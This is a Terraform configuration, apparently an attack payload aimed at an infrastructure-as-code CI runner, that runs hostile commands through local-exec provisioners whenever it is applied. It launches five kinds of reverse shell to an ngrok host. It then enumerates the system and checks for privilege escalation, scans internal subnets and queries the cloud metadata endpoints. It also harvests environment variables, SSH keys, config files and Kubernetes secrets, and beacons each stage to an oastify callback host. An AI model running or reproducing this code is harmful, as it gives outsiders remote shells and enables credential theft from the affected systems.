# main.tf - Ultimate RCE Testing Payload
resource "null_resource" "ultimate_shell" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== ULTIMATE RCE PAYLOAD ==="
      
      # Method 1: Full interactive reverse shell with PTY
      which python3 && echo "Starting Python PTY shell..." && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
      
      # Method 2: Socat for fully interactive shell (if available)
      which socat && echo "Starting socat shell..." && socat TCP:6.tcp.eu.ngrok.io:19850 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
      
      # Method 3: Standard bash reverse shell
      echo "Starting bash reverse shell..." && bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1' &
      
      # Method 4: Netcat with shell
      which nc && echo "Starting netcat shell..." && nc -e /bin/bash 6.tcp.eu.ngrok.io 19850 &
      
      # Method 5: Python without PTY (fallback)
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' &
      
      echo "All reverse shell methods launched"
      
      # Keep the process alive and send confirmation
      curl -X POST -d "ultimate_shell_launched=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/shell_launched
    EOT
  }
}

resource "null_resource" "environment_setup" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== ENVIRONMENT ENUMERATION ==="
      
      # Install useful tools if possible
      which apt-get && apt-get update && apt-get install -y netcat-traditional socat curl wget python3 python3-pip 2>/dev/null
      which apk && apk add --no-cache netcat-openbsd socat curl wget python3 py3-pip 2>/dev/null
      
      # Set up better environment
      export TERM=xterm-256color
      export SHELL=/bin/bash
      alias ll='ls -la'
      
      # Create useful scripts
      cat > /tmp/enum.sh << 'EOF'
#!/bin/bash
echo "=== SYSTEM ENUMERATION ==="
echo "Hostname: $(hostname)"
echo "User: $(whoami)"
echo "ID: $(id)"
echo "IP: $(hostname -i)"
echo "Kernel: $(uname -a)"
echo "OS: $(cat /etc/os-release 2>/dev/null | head -5)"
echo "Processes: $(ps aux | wc -l) running"
echo "Network:"
ip addr 2>/dev/null
echo "Mounts:"
mount | grep -v tmpfs
EOF
      chmod +x /tmp/enum.sh
      
      curl -X POST -d "environment_ready=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/environment
    EOT
  }
}

resource "null_resource" "privilege_escalation" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PRIVILEGE ESCALATION ATTEMPTS ==="
      
      # Check for sudo access
      echo "=== SUDO CHECK ==="
      sudo -l 2>/dev/null && echo "SUDO ACCESS FOUND" || echo "No sudo access"
      
      # Check capabilities
      echo "=== CAPABILITIES ==="
      cat /proc/self/status | grep Cap 2>/dev/null
      which capsh && capsh --print 2>/dev/null
      
      # Check for SUID binaries
      echo "=== SUID BINARIES ==="
      find / -perm -4000 -type f 2>/dev/null | head -20
      
      # Check for writable directories
      echo "=== WRITABLE DIRECTORIES ==="
      find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -10
      
      # Check for cron jobs
      echo "=== CRON JOBS ==="
      crontab -l 2>/dev/null
      ls -la /etc/cron* 2>/dev/null
      
      curl -X POST -d "privilege_check_complete=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/privilege
    EOT
  }
}

resource "null_resource" "network_recon" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== NETWORK RECONNAISSANCE ==="
      
      # Full network scan
      echo "=== INTERNAL NETWORK SCAN ==="
      for subnet in 172.17 172.18 172.19 10.0 192.168; do
        for i in 1 2 3 4 5; do
          ip="$subnet.0.$i"
          ping -c 1 -W 1 $ip 2>/dev/null && echo "Host $ip is alive" && \
          for port in 22 80 443 8080 3000 5432 6379; do
            timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "  Port $port open"
          done
        done
      done
      
      # Check cloud metadata
      echo "=== CLOUD METADATA ==="
      curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo "AWS metadata accessible"
      curl -s http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>/dev/null && echo "GCP metadata accessible"
      
      # DNS enumeration
      echo "=== DNS ENUMERATION ==="
      cat /etc/resolv.conf
      nslookup google.com 2>/dev/null
      nslookup internal.spacelift.dev 2>/dev/null
      
      curl -X POST -d "network_recon_complete=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/network
    EOT
  }
}

resource "null_resource" "credential_harvesting" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== CREDENTIAL HARVESTING ==="
      
      # Harvest all environment variables
      echo "=== ENVIRONMENT VARIABLES ==="
      env | base64 -w0
      echo
      
      # Find all config files
      echo "=== CONFIG FILES ==="
      find / -name "*.env" -o -name "*.conf" -o -name "config" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20
      
      # Look for SSH keys
      echo "=== SSH KEYS ==="
      find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -10
      
      # Check for Kubernetes secrets
      echo "=== KUBERNETES ==="
      ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null
      
      curl -X POST -d "credential_harvesting_complete=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/credentials
    EOT
  }
}
